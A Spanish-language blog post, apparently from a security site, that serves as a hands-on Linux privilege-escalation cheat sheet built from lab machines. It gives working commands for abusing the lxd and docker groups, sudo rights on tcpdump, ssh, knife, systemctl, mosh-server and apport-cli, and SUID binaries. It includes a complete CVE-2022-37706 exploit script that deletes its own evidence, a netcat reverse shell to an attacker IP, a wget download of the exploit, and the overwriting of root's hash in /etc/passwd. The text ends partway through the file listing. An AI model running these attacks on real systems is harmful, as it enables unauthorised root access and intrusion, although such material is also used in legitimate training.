---
date: 2021-11-15T01:14:05.000Z
layout: post
comments: true
title: Escalada de privilegios
subtitle: 'En Linux y Windows'
description: >-
image: >-
  /images/privlogo.png
optimized_image: >-
  /images/privlogo.png
category: ciberseguridad
tags:
  - linux
  - windows
  - hacking
  - post-explotacion
author: Felipe Canales Cayuqueo
paginate: true
---

El usuario root en Linux es el usuario que posee mayor nivel de privilegios. De hecho, es el único que tiene privilegios sobre todo el sistema en su globalidad, así como el responsable de las tareas administrativas.

De este modo, cuando tu, o cualquier programa, quiera llevar a cabo una acción que requiera permisos de superusuario, de alguna manera se les tendrá que conceder o denegar estos privilegios. Pero la pregunta es si soy un usuario común, ¿puedo ser root, sin necesidad de contraseña?. La respuesta es que si con ciertos pasos que veremos a continuación aprovechando las vulnerabilidades que dejan los usuarios administradores.

## Linux

Es importante destacar que existen herramientas que permiten identificar posibles vectores de escalada de privilegios. Algunos ejemplos de estos casos son:

* [LinEnum](https://github.com/rebootuser/LinEnum).
* [LinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS).

### Información del sistema

Conocer la distribución (Ubuntu, Debian, FreeBSD, Fedora, SUSE, Red Hat, CentOS, etc.) te dará una idea de los tipos de herramientas que pueden estar disponibles. Esto también identificaría la versión del sistema operativo, para la cual puede haber exploits públicos disponibles.

```bash
┌─[user@user]─[/]
└──╼ cat /etc/os-release
```

### Información del kernel

Al igual que con la versión del sistema operativo, puede haber exploits públicos que apunten a una vulnerabilidad en una versión específica del kernel. Los exploits del kernel pueden provocar inestabilidad del sistema o incluso un bloqueo total. Tenga cuidado al ejecutarlos en cualquier sistema de producción y asegúrese de comprender completamente el exploit y las posibles ramificaciones antes de ejecutar uno.

```bash
┌─[user@user]─[/]
└──╼ uname -a
Linux 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux
```

### Información adicional sobre el host

```bash
┌─[user@user]─[/]
└──╼ lscpu
```

### Usuarios con carpeta en el directorio home

Es necesario enumerar cada uno de estos directorios para ver si alguno de los usuarios del sistema está almacenando datos confidenciales o archivos que contengan contraseñas. También para tener claro usuarios potenciales para algún movimiento lateral. También es importante verificar las claves SSH de todos los usuarios, ya que podrían usarse para lograr persistencia en el sistema, potencialmente para escalar privilegios o para ayudar con el pivoteo y el reenvío de puertos a la máquina atacante.

```bash
┌─[user@user]─[/]
└──╼ ls -al /home
```

### PATH

A continuación, es útil revisar la variable PATH del usuario actual, ya que define los directorios donde el sistema busca los ejecutables cada vez que se ejecuta un comando. Por ejemplo, cuando se escribe `id`, el sistema localiza y ejecuta el binario correspondiente, que normalmente se encuentra en `/usr/bin/id`. Si la variable PATH está mal configurada (por ejemplo, incluye directorios inseguros o controlables por el usuario), puede ser aprovechada para ejecutar binarios maliciosos y escalar privilegios.

Ejemplo:

```bash
┌─[user@user]─[/home/user]
└──╼ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

┌─[user@user]─[/home/user]
└──╼ PATH=.:${PATH}

┌─[user@user]─[/home/user]
└──╼ export PATH

┌─[user@user]─[/home/user]
└──╼ echo $PATH
.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

> Para hacerlo con un directorio sería de la siguiente forma: PATH=/tmp:$PATH

En este caso, el sistema buscará los comandos en los directorios listados y los ejecutará en ese orden. Si un directorio inseguro aparece antes que los directorios estándar, podría ejecutarse un archivo malicioso con el mismo nombre que un comando legítimo.


### Variables de entorno

También podemos consultar todas las variables de entorno configuradas para nuestro usuario actual, podemos encontrar por ejemplo una contraseña.

```bash
┌─[user@user]─[/]
└──╼ env
SHELL=/bin/sh
MB_DB_PASS=
HOSTNAME=35c2683c50d0
LANGUAGE=en_US:en
MB_JETTY_HOST=0.0.0.0
JAVA_HOME=/opt/java/openjdk
MB_DB_FILE=//metabase.db/metabase.db
PWD=/
LOGNAME=metabase
MB_EMAIL_SMTP_USERNAME=
HOME=/home/metabase
LANG=en_US.UTF-8
META_USER=metalytics
META_PASS=An4lytics_ds20223#
MB_EMAIL_SMTP_PASSWORD=
USER=metabase
SHLVL=2
MB_DB_USER=
FC_LANG=en-US
LD_LIBRARY_PATH=/opt/java/openjdk/lib/server:/opt/java/openjdk/lib:/opt/java/openjdk/../lib
LC_CTYPE=en_US.UTF-8
MB_LDAP_BIND_DN=
LC_ALL=en_US.UTF-8
MB_LDAP_PASSWORD=
PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
MB_DB_CONNECTION_URI=
JAVA_VERSION=jdk-11.0.19+7
_=/usr/bin/env
```

En este caso se detectó la credencial ```An4lytics_ds20223#```.

### Historial de bash

El comando ```history``` en un shell de Linux como Bash (Bourne-Again SHell) muestra un historial de los comandos que has ejecutado previamente. Este historial se almacena en un archivo en tu directorio de inicio, generalmente denominado ```.bash_history```. En ocasiones es posible visualizar contraseñas o información sensible que nos permita escalar privilegios.

```bash
┌─[user@user]─[/]
└──╼ history                                                                            
```

### Detección de unidades y recursos compartidos.

Para obtener información sobre otros dispositivos del sistema como discos duros, unidades USB, etc, podemos usar la herramienta ```lsblk```. Si descubrimos algo es posible que podramos montar alguna de las unidades disponibles.

```bash
┌─[user@user]─[/]
└──╼ lsblk
NAME                      MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
loop0                       7:0    0   55M  1 loop /snap/core18/1705
loop1                       7:1    0   69M  1 loop /snap/lxd/14804
loop2                       7:2    0   47M  1 loop /snap/snapd/16292
loop3                       7:3    0  103M  1 loop /snap/lxd/23339
loop4                       7:4    0   62M  1 loop /snap/core20/1587
loop5                       7:5    0 55.6M  1 loop /snap/core18/2538
sda                         8:0    0   20G  0 disk 
├─sda1                      8:1    0    1M  0 part 
├─sda2                      8:2    0    1G  0 part /boot
└─sda3                      8:3    0   19G  0 part 
  └─ubuntu--vg-ubuntu--lv 253:0    0   18G  0 lvm  /
sr0                        11:0    1  908M  0 rom                                                                                  
```

Podemos detectar credenciales para unidades montadas de la siguiente forma:

```bash
┌─[user@user]─[/]
└──╼ cat /etc/fstab                                                                           
```

### Información de trabajos de impresiones

Es posible encontrar información de impresoras conectadas al sistema y detectar trabajos de impresiones activas o en cola para obtener algún tipo de información confidencial.

```bash
┌─[user@user]─[/]
└──╼ lpstat                                                                             
```

### Posibles hashes en /etc/passwd

Ocasionalmente, veremos hashes de contraseñas directamente en el /etc/passwd archivo. Este archivo es legible por todos los usuarios y, al igual que con los hashes en el /etc/shadow archivo, estos pueden estar sujetos a un ataque de descifrado de contraseñas, a veces este fallo se puede dar en dispositivos y enrutadores integrados.

```bash
┌─[user@user]─[/]
└──╼ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
<...SNIP...>
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
mrb3n:x:1000:1000:mrb3n,,,:/home/mrb3n:/bin/bash
colord:x:111:118:colord colour management daemon,,,:/var/lib/colord:/bin/false
backupsvc:x:1001:1001::/home/backupsvc:
bob.jones:x:1002:1002::/home/bob.jones:
cliff.moore:x:1003:1003::/home/cliff.moore:
logger:x:1004:1004::/home/logger:
shared:x:1005:1005::/home/shared:
stacey.jenkins:x:1006:1006::/home/stacey.jenkins:
sysadm:$6$vdH7vuQIv6anIBWg$Ysk.UZzI7WxYUBYt8WRIWF0EzWlksOElDE0HLYinee38QI1A.0HW7WZCrUhZ9wwDz13bPpkTjNuRoUGYhwFE11:1007:1007::/home/sysadm                                                                             
```

### Grupos

Cada usuario en los sistemas Linux está asignado a un grupo o grupos específicos y, por lo tanto, recibe privilegios especiales.

```bash
┌─[user@user]─[/]
└──╼ cat /etc/group                                                                             
```

El archivo enumera todos los grupos del sistema. Luego podemos usar la herramienta ```getent``` para enumerar miembros de cualquier grupo interesante.

```bash
┌─[user@user]─[/]
└──╼ getent group sudo                                                                             
```

### LXC / LXD

LXD es similar a Docker y actúa como el gestor de contenedores de Ubuntu. Al instalarse, todos los usuarios son agregados al grupo **lxd**. La pertenencia a este grupo puede ser utilizada para **escalar privilegios**, creando un contenedor LXD privilegiado y accediendo al sistema de archivos del host montado en `/mnt/root`.

Primero, confirmamos la pertenencia al grupo:

```
devops@NIX02:~$ id
uid=1009(user) gid=1009(user) groups=1009(user),110(lxd)
```

---

#### Ejemplo con alpine

```
┌─[user@user]─[/]
└──╼ unzip -q alpine.zip
```

```
┌─[user@user]─[/]
└──╼ cd 64-bit\ Alpine/
```

Se inicia el proceso de configuración de LXD utilizando las opciones por defecto:

```
┌─[user@user]─[/64-bit\ Alpine/]
└──╼ lxd init
```

Importamos la imagen local.

```
┌─[user@user]─[/64-bit\ Alpine/]
└──╼ lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
```

Creamos un contenedor con privilegios de root y montamos el sistema de archivos del host.

```
┌─[user@user]─[/64-bit\ Alpine/]
└──╼ lxc init alpine r00t -c security.privileged=true

┌─[user@user]─[/64-bit\ Alpine/]
└──╼ lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
```

Finalmente obtenemos una shell como root.

```
┌─[user@user]─[/64-bit\ Alpine/]
└──╼ lxc start r00t

┌─[user@user]─[/64-bit\ Alpine/]
└──╼ lxc exec r00t /bin/sh

# id
uid=0(root) gid=0(root)
```

### Docker

Agregar un usuario al grupo **docker** es, en la práctica, equivalente a otorgar acceso root al sistema de archivos sin requerir contraseña. Los miembros del grupo pueden iniciar contenedores Docker con volúmenes montados desde el host.

```bash
┌─[user@user]─[/]
└──╼ docker run -v /root:/mnt -it ubuntu
```

Esto monta el directorio `/root` del host dentro del contenedor.

### Disk

Los usuarios pertenecientes al grupo **disk** tienen acceso completo a los dispositivos ubicados en `/dev`, como `/dev/sda1`, que suele contener el sistema de archivos principal. Un atacante con estos privilegios puede utilizar herramientas como `debugfs` para acceder al sistema completo con privilegios de root, permitiendo la extracción de credenciales, claves SSH o la creación de usuarios.

### Adm

Los miembros del grupo **adm** pueden leer todos los logs almacenados en `/var/log`. Aunque esto no concede acceso root directo, puede ser explotado para obtener información sensible, analizar acciones de usuarios o enumerar tareas programadas (cron jobs).

```bash
┌─[user@user]─[/]
└──╼ id
uid=1010(secaudit) gid=1010(secaudit) groups=1010(secaudit),4(adm)
```

### Detección de archivos ocultos

Muchas carpetas y archivos se mantienen ocultos en un sistema Linux para que no sean obvios y se evita la edición accidental.

```bash
┌─[user@user]─[/]
└──╼ find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep htb-student

-rw-r--r-- 1 htb-student htb-student 3771 Nov 27 11:16 /home/htb-student/.bashrc
-rw-rw-r-- 1 htb-student htb-student 180 Nov 27 11:36 /home/htb-student/.wget-hsts
-rw------- 1 htb-student htb-student 387 Nov 27 14:02 /home/htb-student/.bash_history
-rw-r--r-- 1 htb-student htb-student 807 Nov 27 11:16 /home/htb-student/.profile
-rw-r--r-- 1 htb-student htb-student 0 Nov 27 11:31 /home/htb-student/.sudo_as_admin_successful
-rw-r--r-- 1 htb-student htb-student 220 Nov 27 11:16 /home/htb-student/.bash_logout
-rw-rw-r-- 1 htb-student htb-student 162 Nov 28 13:26 /home/htb-student/.notes                                                                             
```

También es posible enumerar los directorios ocultos.

```bash
┌─[user@user]─[/]
└──╼ find / -type d -name ".*" -ls 2>/dev/null                                                                          
```

### Detección de archivos escribibles

Validar si existe algún archivo ejecutado por root que sea modificable por un usuario con privilegios menores.

```bash
┌─[user@user]─[/]
└──╼ find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null                                                                      
```

Para el caso de directorio sería de la siguiente forma:

```bash
┌─[user@user]─[/]
└──╼ find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null                                                                     
```

### Puertos abiertos en la máquina

```bash
┌─[user@user]─[/]
└──╼ ss -lnpt
State     Recv-Q    Send-Q       Local Address:Port        Peer Address:Port    Process                                                                         
LISTEN    0         128                0.0.0.0:23               0.0.0.0:*        users:(("python3",pid=829,fd=3))                                               
LISTEN    0         4096             127.0.0.1:631              0.0.0.0:*                                                                                       
LISTEN    0         4096                 [::1]:631                 [::]:*                                                                                       
```

En este caso hay una página web en la máquina la cual podremos visualizar por medio de [chisel](https://github.com/jpillora/chisel).

### Sudo

Es posible asignar privilegios sudo a una cuenta para permitir la ejecución de comandos específicos con privilegios de root (u otro usuario), sin necesidad de cambiar de sesión ni conceder acceso total al sistema. Al ejecutar un comando con sudo, el sistema valida si el usuario tiene los permisos correspondientes según la configuración definida en el archivo /etc/sudoers. En algunos casos, será necesario ingresar la contraseña del usuario para listar estos permisos. 

Al acceder a un sistema, siempre es recomendable comprobar si el usuario actual posee privilegios sudo ejecutando el siguiente comando:

```bash
┌─[user@user]─[/]
└──╼ sudo -l
```
y ahí aparecerá un binario en el cuál podremos obtener acceso root siguiendo los pasos que nos indican en [GTFOBins](https://gtfobins.github.io/) en algunos casos.

#### Ejemplo

```bash
┌─[user@user]─[/]
└──╼ sudo -l
Matching Defaults entries for randy on corrosion:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User randy may run the following commands on corrosion:
    (root) PASSWD: /home/randy/tools/easysysinfo
```

Al obtener ese resultado nos debemos dirigir al directorio a observar de que se trata:

```bash
┌─[user@user]─[/tools]
└──╼ ls
easysysinfo  easysysinfo.py 
```

En este caso tenemos permisos para remover el archivo, por lo que lo eliminamos y creamos un binario por medio de C como el siguiente:

```C
// Nombre del archivo: test.c

#include <stdlib.h>

int main() {
    system("/bin/bash");
    return 0;
}
```

Lo compilamos y movemos a la carpeta de tools en caso sea necesario, para posteriormente ejecutarlo:

```bash
┌─[user@user]─[/tools]
└──╼ gcc test.c -o easysysinfo

┌─[user@user]─[/tools]
└──╼ ls
easysysinfo  easysysinfo.py  test.c

┌─[user@user]─[/tools]
└──╼ sudo -u root /home/randy/tools/easysysinfo

┌─[root@user]─[/tools#]
└──╼ whoami
root
```

Finalmente obtenemos acceso como usuario root, por lo que el programa funciona correctamente.

Otros casos son los siguientes:

#### Permiso sudo en tcpdump

```bash
┌─[user@user]─[/]
└──╼ sudo -l

Matching Defaults entries for sysadm on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User sysadm may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/tcpdump
```

El atacante puede crear un script de shell oculto (/tmp/.test) que contenga una shell inversa y ejecutarlo de la siguiente forma:

```
┌─[user@user]─[/]
└──╼ sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```

Primero, se crea el archivo que será ejecutado como postrotate-command, agregando una línea simple de shell inversa:

```
┌─[user@user]─[/]
└──╼ cat /tmp/.test
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.10 4646 >/tmp/f
```

A continuación, se inicia un listener de Netcat en la máquina atacante y se ejecuta tcpdump con privilegios de root, especificando el script malicioso como comando post-rotación:

```
┌─[user@user]─[/]
└──╼  sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root

┌─[user@user]─[/]
└──╼  nc -lnvp 4646
listening on [any] 443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.2.12] 38938
bash: cannot set terminal process group (10797): Inappropriate ioctl for device
bash: no job control in this shell

root@NIX02:~# id && hostname               
id && hostname
uid=0(root) gid=0(root) groups=0(root)
```

#### Permiso sudo en SSH

```
┌─[user@user]─[/]
└──╼ sudo -l
[sudo] password for josh: manchesterunited
Matching Defaults entries for josh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
```

```
┌─[user@user]─[/]
└──╼ sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
# whoami
root
```

#### Permiso sudo en bee

```
┌─[user@user]─[/]
└──╼ sudo -l
[sudo] password for user: 
Matching Defaults entries for user on pc:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user may run the following commands on pc:
    (ALL : ALL) /usr/local/bin/bee
```

**Opción 1**.

```
┌─[user@user]─[/]
└──╼ sudo /usr/local/bin/bee eval "system('/bin/bash');"
```

**Opción 2**.

```
┌─[user@user]─[/]
└──╼ sudo /usr/local/bin/bee --root=/var/www/html eval "system('/bin/bash');"
```

#### Permiso sudo en knife

```
┌─[user@user]─[/]
└──╼ sudo -l
Matching Defaults entries for james on knife:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```

```
┌─[user@user]─[/]
└──╼ sudo knife exec -E 'exec "/bin/sh"'
# whoami
root
```

#### Permiso sudo en systemctl

```
┌─[user@user]─[/]
└──╼ sudo -l
sudo -l
Matching Defaults entries for user on user:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on user:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```

```
┌─[user@user]─[/]
└──╼ sudo /usr/bin/systemctl status trail.service
sudo /usr/bin/systemctl status trail.service
WARNING: terminal is not fully functional
-  (press RETURN)!sh
# whoami
whoami
root
```

> Se usa tras ejecutar systemctl !sh

#### Permiso sudo en mosh-server

```
┌─[user@user]─[/]
└──╼ sudo -l
Matching Defaults entries for svcMosh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svcMosh may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/bin/mosh-server

```

```
┌─[user@user]─[/]
└──╼ mosh --server="sudo /usr/bin/mosh-server" localhost
The authenticity of host 'localhost (<no hostip for proxy command>)' can't be established.
ED25519 key fingerprint is SHA256:zrDqCvZoLSy6MxBOPcuEyN926YtFC94ZCJ5TWRS0VaM.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'localhost' (ED25519) to the list of known hosts.
Warning: SSH_CONNECTION not found; binding to any interface.
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Mon Dec 22 02:27:04 AM UTC 2025

  System load:  0.0               Processes:             234
  Usage of /:   63.6% of 6.56GB   Users logged in:       1
  Memory usage: 31%               IPv4 address for eth0: 10.10.11.48
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

root@underpass:~# whoami
root
```

#### Permiso sudo en apport-cli

```
┌─[user@user]─[/]
└──╼ sudo -l
[sudo] password for logan: 
Matching Defaults entries for logan on devvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli
```

Dado que se necesita contar con un archivo de crasheo como condición para explotar esta vulnerabilidad, provocamos un segmentation fault simple. Esto crashea tu shell actual.

```
┌─[user@user]─[/var/crash]
└──╼ ls -al
total 512
drwxrwxrwt  2 root  root    4096 Dec 16 05:57 .
drwxr-xr-x 13 root  root    4096 Sep 12  2023 ..

┌─[user@user]─[/var/crash]
└──╼ kill -SEGV $$
Connection to 10.10.11.242 closed.
```

Al volver a ingresar nuevamente por ejemplo por SSH obtenemos el archivo .crash que necesitamos.

```
┌─[user@user]─[/var/crash]
└──╼ ls -al
total 512
drwxrwxrwt  2 root  root    4096 Dec 16 05:57 .
drwxr-xr-x 13 root  root    4096 Sep 12  2023 ..
-rw-r-----  1 logan logan 515902 Dec 16 05:57 _usr_bin_bash.1000.crash
```

Ejecutamos ```!/bin/bash``` al finalizar el informe de error. 

```
┌─[user@user]─[/var/crash]
└──╼ sudo /usr/bin/apport-cli -c /var/crash/_usr_bin_bash.1000.crash
[sudo] password for logan: 

*** Send problem report to the developers?

After the problem report has been sent, please fill out the form in the
automatically opened web browser.

What would you like to do? Your options are:
  S: Send report (515.6 KB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
  I: Cancel and ignore future crashes of this program version
  C: Cancel
Please choose (S/V/K/I/C): V

*** Collecting problem information

The collected information can be sent to the developers to improve the
application. This might take a few minutes.
............................................................................................................................................................................................................................................................................................................................................
...........................................................................................................................ERROR: Cannot update /var/crash/_usr_bin_bash.1000.crash: [Errno 13] Permission denied: '/var/crash/_usr_bin_bash.1000.crash'
..............:!/bin/bash

root@logan:/var/crash# cd /root
root@logan:~# whoami
root
```

### SUID

El permiso "Set User ID upon Execution" (setuid) permite a un usuario ejecutar un programa o script con los permisos de otros usuario (generalmente root). Este permiso se identifica con la letra ```s```.

```bash
┌─[user@user]─[/]
└──╼ ls -l /usr/bin/passwd
-rwsr-xr-x 1 root root 45420 May 17  2017 /usr/bin/passwd
```

Ahora también podemos buscar todos los binarios SUID a través de ```find```, con el siguiente comando:

```bash
┌─[user@user]─[/]
└──╼ find / -type f -user root -perm -4000 2>/dev/null
/var/htb/bin/emergency
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/traceroute6.iputils
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/mtr
/usr/sbin/pppd
/bin/ping
/bin/ping6
/bin/su
/bin/fusermount
/bin/mount
/bin/umount
```

Otra forma de visualizarlo es con sus permisos correspondientes:

```
┌─[user@user]─[/]
└──╼ find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

Asimismo, es importante revisar los permisos Set-Group-ID (setgid), ya que, al igual que los permisos SUID, pueden ser explotados para ejecutar procesos con privilegios elevados y escalar privilegios (se explotan de la misma forma).

```
┌─[user@user]─[/]
└──╼ find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
```

En el caso de que ```find``` no se encuentra disponible se puede aplicar el siguiente comando para encontrar los binarios vulnerables:

```
┌─[user@user]─[/]
└──╼ ls -alR / 2>/dev/null | awk '
> /^\/.*:$/ {dir=$0; sub(/:$/,"",dir); next}
> $1 ~ /^-..s/ {print dir "/" $NF "  ->  " $0}
```

> Como recomendación muchas formas de explotación se encuentran disponibles en [GTFOBins](https://gtfobins.github.io/).

A continuación se presentan distintas formas de uso:

#### Permiso SUID en apt-get 

```
┌─[user@user]─[/]
└──╼ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh

# id
uid=0(root) gid=0(root) groups=0(root)
```

#### Permiso SUID en Enlightenment

Para este caso hay una vulnerabilidad de escalada de privilegios conocida como CVE-2022-37706 el cual aprovecha la función de biblioteca del sistema dado que maneja incorrectamente las rutas que comienzan con una subcadena /dev/. El siguiente exploit muestra la vulnerabilidad:

```bash
#!/usr/bin/bash
# Idea by MaherAzzouz
# Development by nu11secur1ty

echo "CVE-2022-37706"
echo "[*] Trying to find the vulnerable SUID file..."
echo "[*] This may take few seconds..."

# The actual problem
file=$(find / -name enlightenment_sys -perm -4000 2>/dev/null | head -1)
if [[ -z ${file} ]]
then
	echo "[-] Couldn't find the vulnerable SUID file..."
	echo "[*] Enlightenment should be installed on your system."
	exit 1
fi

echo "[+] Vulnerable SUID binary found!"
echo "[+] Trying to pop a root shell!"
mkdir -p /tmp/net
mkdir -p "/dev/../tmp/;/tmp/exploit"

echo "/bin/sh" > /tmp/exploit
chmod a+x /tmp/exploit
echo "[+] Welcome to the rabbit hole :)"

echo -e "If it is not found in fstab, big deal :D "
${file} /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net

read -p "Press any key to clean the evedence..."
echo -e "Please wait... "

sleep 5
rm -rf /tmp/exploit
rm -rf /tmp/net
echo -e "Done; Everything is clear ;)"
```

```
┌─[user@user]─[/tmp]
└──╼ wget http://10.10.14.10/exploit.sh
--2025-12-11 19:13:25--  http://10.10.14.10/exploit.sh
Connecting to 10.10.14.10:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1005 [text/x-sh]
Saving to: ‘exploit.sh’

exploit.sh                    100%[==============================================>]    1005  --.-KB/s    in 0s      

2025-12-11 19:13:25 (130 MB/s) - ‘exploit.sh’ saved [1005/1005]

┌─[user@user]─[/tmp]
└──╼ chmod +x exploit.sh

┌─[user@user]─[/tmp]
└──╼ ./exploit.sh 
CVE-2022-37706
[*] Trying to find the vulnerable SUID file...
[*] This may take few seconds...
[+] Vulnerable SUID binary found!
[+] Trying to pop a root shell!
[+] Welcome to the rabbit hole :)
If it is not found in fstab, big deal :D 
mount: /dev/../tmp/: can't find in /etc/fstab.
# whoami
root 
```

#### Permiso SUID en Passwd

Una vez detectamos algunos binarios que nos sirva (en este caso ```/usr/bin/passwd```), procedemos a elevar privilegios, a través de openssl:

```
┌─[user@user]─[/]
└──╼ openssl passwd -1 -salt root root
$1$root$9gr5KxwuEdiI80GtIzd.U0
```
Lo que recibimos anteriormente lo copiamos y lo reemplazamos por la ```x``` que aparece en root del ```/etc/passwd```

> Archivo sin editar

```
┌─[user@user]─[/]
└──╼ nano /etc/passwd
GNU nano 3.2                                        /etc/passwd                                 

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
mowree:x:1000:1000:mowree,,,:/home/mowree:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
```

> Archivo editado

```
GNU nano 3.2                                        /etc/passwd                               

root:$1$root$9gr5KxwuEdiI80GtIzd.U0:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
